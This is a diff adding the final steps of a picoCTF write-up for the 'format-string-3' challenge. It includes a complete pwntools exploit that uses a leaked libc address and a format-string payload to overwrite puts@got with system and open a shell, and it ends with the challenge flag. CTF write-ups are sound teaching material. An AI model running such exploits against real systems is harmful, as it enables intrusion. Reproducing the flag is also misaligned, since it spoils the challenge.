@@ -27,4 +27,55 @@ Is there any way to change what a function points to?
 
 > IN GDB
 
+![image](https://github.com/jon-brandy/CTF-WRITE-UP/assets/70703371/48b9bbb5-75a3-4a82-96f6-f6707e3e8456)
 
+8. Nice! `puts@got` can be overwritten.
+9. Now let's find the offset.
+
+> RESULT
+
+![image](https://github.com/jon-brandy/CTF-WRITE-UP/assets/70703371/e1d98173-dfb9-492a-96da-f9b7a0e08d66)
+
+
+10. To overwrite the GOT, I used `fmtstr_payload`, here's the full script:
+
+> FULL SCRIPT
+
+```py
+from pwn import * 
+
+exe = './format-string-3'
+elf = context.binary = ELF(exe, checksec=True)
+context.log_level = 'INFO'
+
+library = './libc.so.6'
+libc = context.binary = ELF(library, checksec=False)
+
+# sh = process(exe)
+sh = remote('rhea.picoctf.net', 58943)
+
+sh.recvuntil(b'libc: ')
+get = sh.recvline().strip()
+get = eval(get)
+info(f'LIBC LEAK --> {hex(get)}')
+
+libc.address = get - libc.sym['setvbuf']
+info(f'LIBC BASE --> {hex(libc.address)}')
+
+payload = fmtstr_payload(38, {elf.got['puts']:libc.sym['system']})
+sh.sendline(payload)
+
+sh.interactive()
+```
+
+> RESULT
+
+![image](https://github.com/jon-brandy/CTF-WRITE-UP/assets/70703371/8632e711-0d0e-421b-af65-27f87106a9bf)
+
+11. We got the flag!
+
+## FLAG:
+
+```
+picoCTF{G07_G07?_cf6cb591}
+```
